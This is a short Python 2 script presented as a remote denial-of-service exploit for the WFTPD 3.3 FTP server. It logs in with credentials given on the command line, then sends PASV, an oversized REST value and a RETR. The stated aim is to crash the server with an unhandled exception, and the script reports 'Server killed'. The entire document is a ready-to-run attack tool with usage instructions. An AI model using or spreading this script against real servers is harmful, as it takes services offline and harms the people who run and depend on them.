# WFTPD 3.3 unhandled exception
#
# (x)dmnt 2010
# -*- coding: windows-1252 -*-
 
import socket
import sys, time
 
 
def help_info():
    print ("Usage: wftpdkill <host> <login> <password> <existingfle>\n")
 
def dos_it(hostname, username, passwd, exfile):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(2048)
    print "[+] Connected"
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    time.sleep(3)
    sock.send("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "Send evil commands"
    time.sleep(3)
    sock.send("pasv\r\n")
    r=sock.recv(1024)
    time.sleep(3)
    sock.send("rest 999999999999999999999999999999999999999999999999999999999999999999\r\n")
    r=sock.recv(1024)
    time.sleep(3)
    sock.send("retr %s\r\n" %exfile)
    time.sleep(3)
    sock.send("Burn, muthfcka, burn!\r\n")
    sock.close()
    print "Server killed\r\n"
 
print ("\nWFTPD 3.3 remote DoS exploit")
 
if len(sys.argv) < 5:
    help_info()
    sys.exit(1)
 
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    exfile=sys.argv[4]
    dos_it(hostname,username,passwd,exfile)
    sys.exit(0)